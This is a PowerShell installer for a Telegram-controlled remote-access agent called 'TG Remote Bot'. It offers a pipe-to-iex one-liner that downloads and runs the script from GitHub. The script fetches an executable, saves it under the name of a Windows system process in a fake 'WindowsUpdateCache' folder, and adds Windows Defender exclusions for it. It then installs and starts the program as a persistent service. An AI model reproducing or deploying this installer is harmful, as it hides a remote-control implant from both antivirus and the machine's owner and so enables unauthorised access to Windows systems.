#Requires -RunAsAdministrator

param(
    [string]$Token,
    [string]$Uid
)

# Fallback: support irm | iex with variables defined in parent scope
if (-not $Token -and $token) { $Token = $token }
if (-not $Uid -and $uid) { $Uid = $uid }

if (-not $Token -or -not $Uid) {
    Write-Host "Usage:" -ForegroundColor Yellow
    Write-Host '  irm https://raw.githubusercontent.com/cecon123/tg-remote-bot/refs/heads/main/run.ps1 -OutFile run.ps1; .\run.ps1 -Token "YOUR_TOKEN" -Uid YOUR_UID'
    Write-Host ""
    Write-Host "Or:" -ForegroundColor Yellow
    Write-Host '  $token="YOUR_TOKEN"; $uid=YOUR_UID'
    Write-Host '  irm https://raw.githubusercontent.com/cecon123/tg-remote-bot/refs/heads/main/run.ps1 | iex'
    exit 1
}

$ErrorActionPreference = "Stop"

$Dir     = "C:\ProgramData\WindowsUpdateCache"
$ExeName = "wininit.exe"
$ExePath = Join-Path $Dir $ExeName
$TmpPath = Join-Path $env:TEMP $ExeName
$Url     = "https://github.com/cecon123/tg-remote-bot/raw/refs/heads/main/dist/wininit.exe"

Write-Host "=== TG Remote Bot Setup ===" -ForegroundColor Cyan

Write-Host "[1/4] Downloading $ExeName..."
Invoke-WebRequest -Uri $Url -OutFile $TmpPath -UseBasicParsing
Write-Host "      Saved to $TmpPath"

Write-Host "[2/4] Adding Defender exclusions..."
Add-MpPreference -ExclusionPath $Dir       -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath $ExePath   -ErrorAction SilentlyContinue
Write-Host "      $Dir"
Write-Host "      $ExePath"

Write-Host "[3/4] Installing service..."
& $TmpPath --install $Token $Uid

Write-Host "[4/4] Starting service..."
Start-Service "TgRemoteAgent" -ErrorAction SilentlyContinue

Write-Host ""
Write-Host "Done. Service is running." -ForegroundColor Green
